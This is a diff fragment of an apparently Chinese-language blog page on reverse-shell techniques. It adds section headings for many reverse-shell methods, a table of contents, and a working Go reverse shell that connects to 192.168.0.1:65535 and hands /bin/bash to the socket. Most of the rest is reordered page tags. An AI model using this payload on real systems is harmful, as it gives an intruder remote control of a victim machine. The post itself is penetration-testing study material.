+<h2 id="Crontab反弹（计划任务）"><a href="#Crontab反弹（计划任务）" class="headerlink" title="Crontab反弹（计划任务）"></a>Crontab反弹（计划任务）</h2><h2 id="ICMP反弹"><a href="#ICMP反弹" class="headerlink" title="ICMP反弹"></a>ICMP反弹</h2><h2 id="golang反弹"><a href="#golang反弹" class="headerlink" title="golang反弹"></a>golang反弹</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;...&#x27;</span> &gt; /tmp/t.<span class="keyword">go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"><span class="keyword">import</span><span class="string">&quot;os/exec&quot;</span>;</span><br><span class="line"><span class="keyword">import</span><span class="string">&quot;net&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    c,_:=net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;192.168.0.1:65535&quot;</span>);</span><br><span class="line">    cmd:=exec.Command(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    cmd.Stdin=c;</span><br><span class="line">    cmd.Stdout=c;</span><br><span class="line">    cmd.Stderr=c;</span><br><span class="line">    cmd.Run()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Cryptcat反弹"><a href="#Cryptcat反弹" class="headerlink" title="Cryptcat反弹"></a>Cryptcat反弹</h2><h2 id="MSF反弹"><a href="#MSF反弹" class="headerlink" title="MSF反弹"></a>MSF反弹</h2><h2 id="Powershell反弹"><a href="#Powershell反弹" class="headerlink" title="Powershell反弹"></a>Powershell反弹</h2><h2 id="利用OpenSSL对数据流加密"><a href="#利用OpenSSL对数据流加密" class="headerlink" title="利用OpenSSL对数据流加密"></a>利用OpenSSL对数据流加密</h2>
       
 
       
@@ -404,7 +533,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">1.</span> <span class="toc-text">文件描述符</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.1.</span> <span class="toc-text">重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.1.1.</span> <span class="toc-text">输入重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.1.2.</span> <span class="toc-text">输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA%E4%B8%8E%E6%A0%87%E5%87%86%E9%94%99%E8%AF%AF%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.1.3.</span> <span class="toc-text">标准输出与标准错误输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E7%9A%84%E5%A4%8D%E5%88%B6"><span class="toc-number">1.1.4.</span> <span class="toc-text">文件描述符的复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-%E7%BB%91%E5%AE%9A%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.1.5.</span> <span class="toc-text">exec 绑定重定向</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shell"><span class="toc-number">2.</span> <span class="toc-text">shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.1.</span> <span class="toc-text">反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.</span> <span class="toc-text">shell反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dev-tcp-ip-port"><span class="toc-number">2.2.1.</span> <span class="toc-text">&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8F%8D%E5%BC%B9%E8%AF%AD%E5%8F%A5%E5%8F%8A%E8%A7%A3%E9%87%8A"><span class="toc-number">2.3.</span> <span class="toc-text">常见反弹语句及解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">2.3.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">2.3.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">2.3.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">2.3.4.</span> <span class="toc-text">4</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">原理篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">1.1.</span> <span class="toc-text">文件描述符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.2.</span> <span class="toc-text">重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">重定向执行顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">输入重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%96%87%E4%BB%B6%E2%80%98test-input%E2%80%99"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">将输入重定向到文件‘test_input’</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.2.3.</span> <span class="toc-text">输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA%E4%B8%8E%E6%A0%87%E5%87%86%E9%94%99%E8%AF%AF%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.2.4.</span> <span class="toc-text">标准输出与标准错误输出重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">错误输出重定向测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E7%9A%84%E5%A4%8D%E5%88%B6"><span class="toc-number">1.2.5.</span> <span class="toc-text">文件描述符的复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-%E7%BB%91%E5%AE%9A%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.2.6.</span> <span class="toc-text">exec 绑定重定向</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shell"><span class="toc-number">2.</span> <span class="toc-text">shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.1.</span> <span class="toc-text">反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.</span> <span class="toc-text">shell反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dev-tcp-ip-port"><span class="toc-number">2.2.1.</span> <span class="toc-text">&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8F%8D%E5%BC%B9%E8%AF%AD%E5%8F%A5%E5%8F%8A%E8%A7%A3%E9%87%8A"><span class="toc-number">2.3.</span> <span class="toc-text">常见反弹语句及解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">2.3.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">2.3.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">2.3.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">2.3.4.</span> <span class="toc-text">4</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%AF%87"><span class="toc-number">3.</span> <span class="toc-text">应用篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A1%AE%E5%AE%9A%E2%BD%AC%E6%A0%87%E2%BD%80%E6%8C%81%E7%9A%84%E5%8F%8D%E5%BC%B9%E2%BD%85%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">命令确定⽬标⽀持的反弹⽅式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.2.</span> <span class="toc-text">bash反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.3.</span> <span class="toc-text">nc反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.4.</span> <span class="toc-text">python反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby%E5%8F%8D%E5%BC%B9-%E9%94%99%E8%AF%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">3.5.</span> <span class="toc-text">ruby反弹(错误的文件描述符)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">3.5.1.</span> <span class="toc-text">windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.6.</span> <span class="toc-text">exec反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lua%E5%8F%8D%E5%BC%B9-%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85luasocket%E6%A8%A1%E5%9D%97"><span class="toc-number">3.7.</span> <span class="toc-text">lua反弹(无法安装luasocket模块)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lua%E5%AE%89%E8%A3%85"><span class="toc-number">3.7.1.</span> <span class="toc-text">lua安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99"><span class="toc-number">3.7.2.</span> <span class="toc-text">报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85socket%E5%8C%85"><span class="toc-number">3.7.3.</span> <span class="toc-text">安装socket包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.8.</span> <span class="toc-text">perl反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%8F%8D%E5%BC%B9-%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E7%BC%BA%E5%B0%91"><span class="toc-number">3.9.</span> <span class="toc-text">java反弹(编译环境缺少)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#telnet%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.10.</span> <span class="toc-text">telnet反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.11.</span> <span class="toc-text">php反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.12.</span> <span class="toc-text">ssh反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.13.</span> <span class="toc-text">Curl反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#awk%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.14.</span> <span class="toc-text">awk反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crontab%E5%8F%8D%E5%BC%B9%EF%BC%88%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%EF%BC%89"><span class="toc-number">3.15.</span> <span class="toc-text">Crontab反弹（计划任务）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.16.</span> <span class="toc-text">ICMP反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#golang%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.17.</span> <span class="toc-text">golang反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cryptcat%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.18.</span> <span class="toc-text">Cryptcat反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.19.</span> <span class="toc-text">MSF反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.20.</span> <span class="toc-text">Powershell反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8OpenSSL%E5%AF%B9%E6%95%B0%E6%8D%AE%E6%B5%81%E5%8A%A0%E5%AF%86"><span class="toc-number">3.21.</span> <span class="toc-text">利用OpenSSL对数据流加密</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -520,26 +649,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Robocopy</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件管理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">excel</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">学习</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">注册表</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">工作</a>
               </li>
              
@@ -552,7 +661,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Robocopy</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件管理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">GIT</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">注册表</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">excel</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -612,15 +741,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">阿里云</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">JS</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">浏览器，开发</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">阿里云</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -633,6 +762,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">端口转发</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">HTML</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
              
               <li class="article-tag-list-item">
